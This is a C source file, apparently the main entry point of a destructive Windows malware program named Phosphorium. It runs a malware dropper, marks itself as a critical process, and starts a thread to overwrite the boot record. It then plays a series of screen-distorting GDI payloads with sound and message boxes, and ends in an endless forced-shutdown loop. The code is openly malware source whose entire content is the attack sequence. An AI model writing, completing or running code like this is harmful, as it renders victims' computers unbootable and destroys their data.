#include "phosphorium.h"

INT
WINAPI
wWinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR lpwszCmdLine,
	_In_ INT nShowCmd
)
{
	UNREFERENCED_PARAMETER(hInstance);
	UNREFERENCED_PARAMETER(hPrevInstance);

	UNREFERENCED_PARAMETER(lpwszCmdLine);
	UNREFERENCED_PARAMETER(nShowCmd);

	CreateMutexW(NULL, TRUE, L"Phosphorium.exe");

	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return FALSE;
	}

	if (!ExecuteMalwareDropper())
	{
		return FALSE;
	}

	if (!SetProcessAsCriticalProcess())
	{
		return FALSE;
	}

	SeedXorshift32(__rdtsc());
	CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)InitialTimer, (PVOID)1000, 0, NULL);
	CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)OverwriteBootRecord, NULL, 0, NULL));

	Sleep(3000);

	CreateThread(NULL, 0, SoundThread, 0, NULL, NULL);

	ExecuteGdiShader(GdiShader1, PAYLOAD_TIME);
	ExecuteGdiShader(GdiShader2, PAYLOAD_TIME);
	ExecuteGdiShader(GdiShader3, PAYLOAD_TIME);
	ExecuteGdiShader(GdiShaderWave, PAYLOAD_TIME);
	ExecuteGdiShader(GdiShader5, PAYLOAD_TIME);
	ExecuteGdiShader(GdiShader6, PAYLOAD_TIME);

	CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MessageBoxPayload, NULL, 0, NULL));
	ExecuteGdiShader(FinalGdiShader, PAYLOAD_TIME);

	for (;;)
	{
		ForceShutdownDevice();
	}
}